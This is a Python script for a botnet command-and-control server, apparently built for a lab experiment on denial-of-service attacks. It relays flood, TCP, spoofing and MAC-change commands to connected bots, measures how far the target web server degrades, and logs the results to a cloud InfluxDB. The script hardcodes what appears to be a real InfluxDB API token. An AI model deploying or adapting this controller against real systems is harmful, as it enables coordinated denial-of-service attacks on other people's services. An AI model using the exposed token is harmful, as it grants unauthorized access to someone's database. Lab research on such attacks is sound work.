import os
import csv
import socket
import time
import random
import requests
from influxdb_client_3 import InfluxDBClient3, Point

# ======== set parameter =====================
ip = "10.0.0.11"               # IP of botnet
Interface = "attacker1-wlan0"  # interface of botnet
url = "http://10.0.0.4/"       # URL of target
target_ip = "10.0.0.4"         # IP of target

HOST = "10.0.0.11"             # IP of the attacker server (changed from 0.0.0.0 for clarity)
PORT = 700                     # port for communication

INFLUXDB_TOKEN='9W63Im87qHW0STSoyRPt4fKDrdGc7hp2pdrzEpnx3f5wIJgAujb46VbPUDfadqfaVnpleZWW2FSyKnUc-ocxCw=='
host = "https://us-east-1-1.aws.cloud2.influxdata.com"
database = "Attacker"
org = "KMUTT"

# Create global InfluxDB v3 client
client = InfluxDBClient3(host=host, token=INFLUXDB_TOKEN, org=org, database=database)

# ========= InfluxDB ==============================
def upload_to_influxdb(timestamp, avg_delay, min_delay, max_delay, packet_loss):
    """Upload latency statistics to InfluxDB v3."""
    point = (
        Point("latency_stats")
        .tag("node", "attacker_server")
        .field("timestamp", timestamp)
        .field("Loss", packet_loss)
        .field("AvgDelay", avg_delay)
        .field("MinDelay", min_delay)
        .field("MaxDelay", max_delay)
    )
    
    try:
        client.write(point)
        print("Successfully uploaded latency stats to InfluxDB")
    except Exception as e:
        print(f"Failed to upload to InfluxDB: {e}")

# ========= CSV ==============================
def save_to_csv(data):
    file_exists = os.path.isfile("result.csv")
    with open("result.csv", mode="a", newline="") as file:
        writer = csv.writer(file)
        if not file_exists:
            writer.writerow(
                ["Timestamp", "Avg Delay (ms)", "Min Delay (ms)", "Max Delay (ms)", "Packet Loss (%)"]
            )
        writer.writerow(data)

# ======== Measure Impact ========================
def user_traffic(url="http://10.0.0.4/"):
    total_delay = 0.0
    min_delay = float("inf")
    max_delay = 0.0
    failed_requests = 0

    for i in range(10):
        headers = {
            "User-Agent": random.choice(
                [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                ]
            ),
            "X-Forwarded-For": ip,
            "X-Traffic-Label": "normal",
        }

        start_time = time.time()
        try:
            response = requests.get(url, headers=headers, timeout=5)
            delay = (time.time() - start_time) * 1000  # delay in milliseconds

            total_delay += delay
            min_delay = min(min_delay, delay)
            max_delay = max(max_delay, delay)

            print(f"Packet #{i+1} | Status: {response.status_code} | Delay: {delay:.2f} ms")

        except requests.exceptions.RequestException as e:
            failed_requests += 1
            print(f"Packet #{i+1} Failed: {e}")

        time.sleep(random.uniform(0.1, 3))

    # Calculate averages
    avg_delay = total_delay / (10 - failed_requests) if (10 - failed_requests) > 0 else 0.0
    packet_loss = (failed_requests / 10) * 100

    # Upload to InfluxDB
    upload_to_influxdb(time.time(), avg_delay, min_delay, max_delay, packet_loss)

    # Optional: save to CSV (uncomment if you want it)
    # save_to_csv([time.time(), avg_delay, min_delay, max_delay, packet_loss])

    return f"Summary from user: Avg Delay: {avg_delay:.2f} ms | Min Delay: {min_delay:.2f} ms | Max Delay: {max_delay:.2f} ms | Packet Loss: {packet_loss:.2f}%"

# ======== Server Setup ========================
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Helps avoid "address already in use"
s.bind((HOST, PORT))
s.listen()

clients = []
is_data = False

print(f"Server listening on {HOST}:{PORT}")

while True:
    conn, addr = s.accept()
    clients.append(conn)
    data = conn.recv(1024)
    print("Received", data, "from", addr)

    while True:
        if is_data:
            data = conn.recv(1024)
            print("Received response:", data.decode(errors='ignore'))
            is_data = False

        command = input("Enter your command: ")

        if command == "help":
            print("move: move to a new access point")
            print("user_traffic: measure user traffic")
            print("attacker_traffic: measure attacker traffic")
            print("change_mac: change MAC address of interface")
            print("http_re <pps>: send HTTP requests with pps packets per second")
            print("tcp_attack <pps>: send TCP packets with pps packets per second")
            print("spoof_attack <pps>: send spoofed packets with pps packets per second")
            print("wait: wait for another client to connect")
            print("exit: close socket")

        elif command == "user_traffic":
            result = user_traffic(url)
            print(result)

        elif command == "wait":
            break

        elif command == "exit":
            for client_conn in clients:
                client_conn.sendall(command.encode())
            print("Please wait for the server to close the connection")
            print("Exiting...")
            s.close()
            exit()

        else:
            for client_conn in clients:
                client_conn.sendall(command.encode())
            print(f"Sent: {command}")
            result = user_traffic(url)
            print(result)
            print("Please wait for the respond...")
            is_data = True
